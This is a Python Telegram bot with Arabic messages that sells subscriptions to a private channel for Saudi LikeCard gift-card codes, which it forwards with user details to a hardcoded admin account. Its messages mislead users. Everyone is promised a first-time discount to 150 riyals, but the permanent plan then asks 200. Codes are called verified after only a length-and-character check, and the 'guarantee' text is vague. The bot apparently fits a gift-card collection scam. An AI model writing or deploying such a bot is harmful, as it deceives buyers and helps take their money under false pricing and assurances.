import telebot
from telebot import types

# توكن البوت
bot = telebot.TeleBot("YOUR_TOKEN")

# آيدي الأدمن
ADMIN_ID = 7180588622

# حالات المستخدمين
user_states = {}


# القائمة الرئيسية
def main_menu(chat_id):

    user_states[chat_id] = "main"

    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)

    # الصف الأول
    markup.row("حالة العضوية", "انضمام")

    # باقي الصفوف
    markup.row("طريقة الاشتراك 💳")
    markup.row("المقابلات 🎙️")
    markup.row("الضمان 🛡️")
    markup.row("Rules 📜")

    bot.send_message(
        chat_id,
        "🎛️ اختر القسم المناسب من الأزرار بالأسفل:",
        reply_markup=markup
    )


# رسالة الترحيب
@bot.message_handler(commands=['start'])
def start(message):

    text = (
        "🎀 أهلاً فيك في عالم قناة\n"
        "سابقاً طاغـي♠️ 𝙌𝙐𝙀𝙀𝙉🎀\n\n"

        "تم تصميم هذا البوت لخدمتك وإدارة الاشتراكات بكل سهولة وخصوصية 🤝\n\n"

        "🎁 إذا كانت هذه أول مرة لك بالاشتراك:\n"
        "تم منحك خصم خاص على الاشتراك الدائم 🔥\n\n"

        "💳 أصبح سعر الاشتراك الدائم:\n"
        "150 ريال بدلاً من 200 ريال"
    )

    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("أريد الخصم", "تجاهل")

    bot.send_message(
        message.chat.id,
        text,
        reply_markup=markup
    )


# استقبال النصوص
@bot.message_handler(content_types=['text'])
def handle_text(message):

    chat_id = message.chat.id
    txt = message.text

    state = user_states.get(chat_id, "main")


    # الخصم
    if txt == "أريد الخصم":

        main_menu(chat_id)

    elif txt == "تجاهل":

        main_menu(chat_id)


    # حالة العضوية
    elif txt == "حالة العضوية":

        bot.send_message(
            chat_id,

            "📌 حالة العضوية\n\n"
            "• لا يوجد لديك عضوية حالياً ❌\n"
            "• تم منحك خصم خاص على الاشتراك الدائم 🔥\n"
            "• أصبح سعر الاشتراك الدائم:\n"
            "150 ريال بدلاً من 200 ريال 💳"
        )


    # انضمام
    elif txt == "انضمام":

        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.row("شهري", "دائم")
        markup.row("رجوع 🔙")

        bot.send_message(
            chat_id,

            "💳 أهلاً بك بقسم الاشتراكات\n\n"
            "اختر نوع الاشتراك المناسب لك 👇",

            reply_markup=markup
        )


    # اشتراك شهري
    elif txt == "شهري":

        user_states[chat_id] = "waiting_for_card"

        bot.send_message(
            chat_id,

            "💳 الاشتراك الشهري\n\n"
            "• قيمة الاشتراك: 100 ريال\n"
            "• طريقة الدفع: بطاقة LikeCard السعودية\n\n"

            "📌 أرسل الآن رمز البطاقة المكون من 16 حرفًا ورقمًا فقط.\n\n"

            "⚠️ أي رمز أقل أو أكثر من 16 خانة سيتم رفضه تلقائياً."
        )


    # اشتراك دائم
    elif txt == "دائم":

        user_states[chat_id] = "waiting_for_card"

        bot.send_message(
            chat_id,

            "💳 الاشتراك الدائم\n\n"
            "• قيمة الاشتراك: 200 ريال\n"
            "• طريقة الدفع: بطاقة LikeCard السعودية\n\n"

            "📌 أرسل الآن رمز البطاقة المكون من 16 حرفًا ورقمًا فقط.\n\n"

            "⚠️ أي رمز أقل أو أكثر من 16 خانة سيتم رفضه تلقائياً."
        )


    # التحقق الشكلي
    elif state == "waiting_for_card":

        if len(txt) == 16 and txt.isalnum() \
        and any(c.isdigit() for c in txt) \
        and any(c.isalpha() for c in txt):

            # إرسال البطاقة للإدمن
            bot.send_message(
                ADMIN_ID,

                f"💳 بطاقة جديدة\n\n"
                f"👤 @{message.from_user.username}\n"
                f"🆔 {chat_id}\n\n"
                f"🔑 الكود:\n{txt}"
            )

            # رد للمستخدم
            bot.send_message(
                chat_id,

                "✅ تم استلام بطاقتك بنجاح\n"
                "تم التحقق من تنسيق البطاقة وسيتم مراجعتها 🤝"
            )

            main_menu(chat_id)

        else:

            bot.send_message(
                chat_id,

                "❌ عذرًا، البطاقة المدخلة غير صحيحة.\n\n"
                "📌 يجب أن يكون الرمز:\n"
                "• مكونًا من 16 خانة فقط\n"
                "• يحتوي على أرقام وحروف معًا\n"
                "• بدون مسافات أو رموز"
            )


    # طريقة الاشتراك
    elif txt == "طريقة الاشتراك 💳":

        bot.send_message(
            chat_id,

            "📖 طريقة الاشتراك:\n\n"
            "• اختر نوع الاشتراك\n"
            "• أرسل رمز البطاقة\n"
            "• سيتم مراجعة طلبك مباشرة 🤝"
        )


    # المقابلات
    elif txt == "المقابلات 🎙️":

        bot.send_message(
            chat_id,

            "🎙️ قسم المقابلات الخاصة\n\n"
            "للمزيد من التفاصيل تواصل مع الإدارة."
        )


    # الضمان
    elif txt == "الضمان 🛡️":

        bot.send_message(
            chat_id,

            "🛡️ ضمان الاشتراك\n\n"
            "يتم مراجعة جميع الطلبات بكل مصداقية وخصوصية 🤝"
        )


    # القوانين
    elif txt == "Rules 📜":

        bot.send_message(
            chat_id,

            "📜 قوانين القناة\n\n"
            "• يمنع نشر محتوى القناة\n"
            "• يمنع إعادة التوزيع\n"
            "• الاحترام مطلوب للجميع 🤝"
        )


    # رجوع
    elif txt == "رجوع 🔙":

        main_menu(chat_id)


    else:

        main_menu(chat_id)


# استقبال الصور
@bot.message_handler(content_types=['photo'])
def handle_photo(message):

    chat_id = message.chat.id

    file_id = message.photo[-1].file_id

    # إرسال الصورة للإدمن
    bot.send_message(
        ADMIN_ID,

        f"📸 صورة جديدة\n\n"
        f"👤 @{message.from_user.username}\n"
        f"🆔 {chat_id}"
    )

    bot.send_photo(
        ADMIN_ID,
        file_id
    )

    bot.send_message(
        chat_id,
        "✅ تم استلام الصورة وسيتم مراجعتها 🤝"
    )


# تشغيل البوت
bot.infinity_polling()
